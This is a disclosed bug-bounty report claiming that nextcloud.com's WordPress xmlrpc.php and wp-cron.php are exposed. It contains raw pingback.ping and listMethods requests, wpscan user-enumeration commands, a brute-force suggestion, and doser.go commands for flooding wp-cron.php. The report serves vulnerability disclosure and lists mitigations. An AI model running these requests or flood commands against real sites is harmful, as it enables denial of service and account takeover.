# xmlrpc.php &wp-cron.php files are enabled, and will used for (DDOS),(DOS) and broutforce users attack.

## Report Details
- **Report ID**: 2299069
- **URL**: https://hackerone.com/reports/2299069
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2023-12-29T11:33:44.244Z
- **Disclosed**: 2024-02-08T14:25:00.710Z

## Reporter
- **Username**: cyber-tech
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi Hackerones Team,
After previewing my target scopes and restrictions, I detremined to choese myscope " https://nextcloud.com " and started my testing phases.
 
1->>  - XML-RPC is a feature of WordPress that enables data to be transmitted, with HTTP acting as the ‘transport mechanism’ and XML as the  
                  ‘encoding mechanism’. Basically it is an Application Programming Interface that allows developers to communicate with the website remotely 
                  using any kind of gadgets for ex: Developers can upload, modify, delete or update website contents using there mobile device if they are not 
                  carrying  laptop   with them.
               - Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The 
                  website  https://nextcloud.com/xmlrpc.php/ has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other 
                  victim hosts.

2->> The wp-cron.php file is responsible for scheduled events in a WordPress website. By default, when a request is made, WordPress will generate an 
              additional request from it to the wp-cron.php file. By generating a large number of requests to the website, it is therefore possible to make the 
              site perform a DoS attack on itself. I found this vulnerability at https://nextcloud.com/wp-cron.php endpoint

3->>  In order to determine whether the  https://nextcloud.com/xmlrpc.php  or  https://nextcloud.com/wp-cron.php file  are enabled or not
           i used >>>  wpscan  --url  http://nextcloud.com  --enumerate  u
 

#### Steps To Reproduce:

>>Step 1. Use the Repeater tab in Burp, send the request below.

POST /xmlrpc.php HTTP/2
Host: nextcloud.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 139

<?xml version=”1.0" encoding=”UTF-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>

>>> It's response was :

HTTP/2 200 OK
X-Robots-Tag: noindex, follow
Date: Thu, 28 Dec 2023 22:43:12 +0000
Strict-Transport-Security: max-age=15768000; includeSubDomains; preload
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Vary: Accept-Encoding
Cache-Control: max-age=0
Expires: Thu, 28 Dec 2023 22:43:12 GMT
Content-Length: 4581
Content-Type: text/xml; charset=UTF-8
Server: Apache

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>translationproxy.updated_job_status</string></value>
  <value><string>translationproxy.test_xmlrpc</string></value>
  <value><string>translationproxy.get_languages_list</string></value>
  <value><string>wpml.get_languages</string></value>
  <value><string>wpml.get_post_trid</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>

Notice that a successful response is received showing that the xmlrpc.php file is enabled.
----------------------------------------------------------------------------------------------------------------------------------------

   >> Step 2. Username Enumeration: For Username enumeration, I performed my scan using wpscan tool which is popular WordPress scanner for scanning WordPress Vulnerabilities.
* Make sure you have the latest updates. 
   follow the next steps:

 -    wpscan  --url  http://nextcloud.com  --enumerate  u
 The Result was:

 [i] User(s) Identified:

[+] Mi-----ev
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Mi----er
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] J------iet
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Vi---- nyy
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)
By useing these usernames the attacker can broutforce the passowrds With burp's intruder or any other tool.
---------------------------------------------------------------------------------------------------------------------------------
  
>> Step . 3. Now, considering the domain  https://vmlj9gt0rjmxrtgsqlp1f10hj8pydn.oastify.com  the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.
 
 POST /xmlrpc.php HTTP/2
Host: http://nextcloud.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 344
<?xml version="1.0" encoding="UTF-8"?>
Code 286 BytesUnwrap lines Copy Download
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://vmlj9gt0rjmxrtgsqlp1f10hj8pydn.oastify.com </string></value>
</param>
<param>
<value><string>//http://nextcloud.com</string></value>
</param>
</params>
</methodCall>

My burp collaborator recived the following data:

1-(The Collaborator server received a DNS lookup of type A for the domain name vmlj9gt0rjmxrtgsqlp1f10hj8pydn.oastify.com.  The lookup was received 
 from IP address 66.185.117.247 at 2023-Dec-28 23:20:49 UTC.)  
2-(The Collaborator server received a DNS lookup of type A for the domain name hbww3w9q0reg6waj01swvpedp4vujj.oastify.com.  The lookup was received from IP address 66.185.117.250 at 2023-Dec-28 23:08:21 UTC.)
---------------------------------------------------------------------------------------------------------------------------------
>> Step 4. Back to wordpress scan tool results ( wpscan  --url  http://nextcloud.com  --enumerate  u ) :
What /wp-cron.php?
This script is used by WordPress to perform scheduled tasks, such as publishing scheduled posts, checking for updates, and running plugins.
An attacker can exploit this vulnerability by sending a large number of requests to the wp-cron.php script, causing it to consume excessive resources and overload the server. This can lead to the application becoming unresponsive or crashing, potentially causing data loss and downtime.

he external WP-Cron seems to be enabled: https://nextcloud.com/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Attcker can use  >> Step . 3  to send alot of  requests using xmlrpc.php  https://nextcloud.com/wp-cron.php  and if he wrote an python script to perform his attack with the header details , thes action can lead to stop  wp-cron.php services .And he can make it using doser.go DOS attack tool .
                  
Steps to Reproduce using access to xmlrpc.php file:

                POST /xmlrpc.php HTTP/2
                 Host: http://nextcloud.com
                 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
                 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
                 Accept-Language: en-US,en;q=0.5
                 Accept-Encoding: gzip, deflate
                 Upgrade-Insecure-Requests: 1
                 Sec-Fetch-Dest: document
                 Sec-Fetch-Mode: navigate
                Sec-Fetch-Site: none
                 Sec-Fetch-User: ?1
                  Te: trailers
                  Content-Type: application/x-www-form-urlencoded
                   Content-Length: 344
                   <?xml version="1.0" encoding="UTF-8"?>
                  Code 286 BytesUnwrap lines Copy Download
                  <methodCall>
                  <methodName>pingback.ping</methodName>
                 <params>
                  <param>
                  <value><string>https://vmlj9gt0rjmxrtgsqlp1f10hj8pydn.oastify.com </string></value>
                   </param>
                  <param>
                 <value><string>https://nextcloud.com/wp-cron.php</string></value>
                </param>
                 </params>
                 </methodCall>

Steps to Reproduce using doser tool:
                   if you gave me to test it, i will follow these steps,
                   1- git clone https://github.com/Quitten/doser.go.git
                  2- cd /doser.go
                  3- ./doser -t 9999 -g 'https://nextcloud.com/wp-cron.php' -t => number of requests
                   4- you can send unlimited requests to https://nextcloud.com/wp-cron.php 

Material/References:
              1-https://hackerone.com/reports/1619536
              2-  https://hackerone.com/reports/752073
              3- https://github.com/wpscanteam/wpscan/issues/1299
              4- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
              5- https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
              6- https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
              7-https://ms-official5878.medium.com/xml-rpc-php-wordpress-vulnerabilities-9a7d66068bde

## Impact

-This method is also used for brute force attacks to stealing the admin credentials and other important credentials.
-This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
-The attacker can use accessing >> https://nextcloud.com/wp-cron.php: 
              ++ To force the server to perfom DOS attack to it's self.
              ++ To perfom DOS attack and denial services rendering the application unavailable.
              ++ Server overload and increased resource usage, leading to slow response times or application crashes.
              ++ Potential data loss and downtime between servers.

Recommendation

1- If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.
note: screenshots are given in the file below.
2-Add the variable DISABLE_WP_CRON to true in the file wp-config.php and restrict access to the file wp-cron.php.
3- Enable cloudflare request rate limiting.
4-Add the following line of code to the file (: define('DISABLE_WP_CRON', true); :)

## Attachments
- xmlrpc.php_wp-cron.php.pdf
